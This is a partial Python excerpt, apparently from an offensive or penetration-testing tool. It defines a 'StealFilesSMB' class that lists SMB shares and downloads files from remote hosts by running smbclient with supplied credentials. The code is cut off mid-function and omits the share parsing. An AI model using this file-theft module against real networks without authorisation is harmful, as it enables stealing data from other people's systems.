...
class StealFilesSMB:
    ...
    def smb2_list_shares(self, ip, username, password):
        """List shares via system smbclient -L (SMB2/3)."""
        cmd = f'smbclient -L //{shlex.quote(ip)} -U {shlex.quote(f"{username}%{password}")}'
        try:
            stdout, stderr, returncode = subprocess_with_timeout(cmd, timeout=60)
            if b"Sharename" not in stdout:
                return []
            shares = []
            ...
            logger.debug(f"smbclient -L: {len(shares)} shares on {ip}")
            return shares
        except Exception as e:
            logger.debug(f"smbclient -L failed for {ip}: {e}")
            return []

    def smb2_download_file(self, ip, username, password, share, remote_path, local_path):
        """Download a file via system smbclient 'get' (SMB2/3)."""
        clean_path = remote_path.lstrip('/').lstrip('\\').replace('/', '\\')
        local_dir = os.path.dirname(local_path)
        try:
            os.makedirs(local_dir, exist_ok=True)
            cmd = (
                f'smbclient //{shlex.quote(ip)}/{shlex.quote(share)} '
                f'-U {shlex.quote(f"{username}%{password}")} '
                f'-c {shlex.quote(f"get {clean_path} {local_path}")}'
            )
            stdout, stderr, returncode = subprocess_with_timeout(cmd, timeout=120)
            if returncode == 0 and os.path.exists(local_path) and os.path.getsize(local_path) > 0:
